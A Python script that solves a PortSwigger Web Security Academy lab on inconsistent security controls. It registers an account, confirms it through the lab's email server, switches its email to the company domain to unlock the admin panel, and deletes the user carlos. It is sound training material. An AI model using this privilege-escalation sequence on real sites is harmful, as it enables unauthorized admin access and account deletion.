#!/usr/bin/env python


'''This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete Carlos.

Lab link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
'''

import requests
from bs4 import BeautifulSoup

s = requests.session()
lab_id = '0adc000203236806804fd531008c0044' #change based on generated lab
email_id = '0ab3001b03f568c4801dd45001bc0096' #changed based on provided generated email service id


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # register a new account #
    # first get the csrf token
    uri = f"https://{lab_id}.web-security-academy.net/register"
    r = s.get(uri) 
    token = token_extract(r.text) # register csrf token
    # then post our new account data
    data = { 'csrf': token,
            'username': 'hacker',
            'email': f'attacker@exploit-{email_id}.exploit-server.net',
            'password': 'hacking'}
    r2 = s.post(uri, data=data)
    # check email server for the registration link
    uri = f"https://exploit-{email_id}.exploit-server.net/email"
    r3 = s.get(uri)
    soup = BeautifulSoup(r3.text, 'html.parser')
    links = [link.get('href') for link in soup.find_all('a') if 'temp-registration' in link.get('href')]
    # Use the most recently generated password reset link in case there are multiple links found from the array generator above
    uri = links[0]
    # Use the registration link to confirm the account
    r4 = s.get(uri)

    # login to the new account #
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r5 = s.get(uri)
    token = token_extract(r5.text) # login csrf token
    # login data for post
    data = { 'csrf' : token,
            'username' : 'hacker',
            'password' : 'hacking'}
    r6 = s.post(uri, data=data)

    # change email of the new account #
    uri = f"https://{lab_id}.web-security-academy.net/my-account?id=hacker"
    r7 = s.get(uri)
    token = token_extract(r7.text) # email change csrf token
    # new email post request
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-email"
    data = { 'email': 'hacker@dontwannacry.com', # dontwannacry domain allows access to the admin page
            'csrf' : token}
    r8 = s.post(uri, data=data)

    # delete carlos # 
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r9 = s.get(uri)
    print('finished')

if __name__ == '__main__':
    main()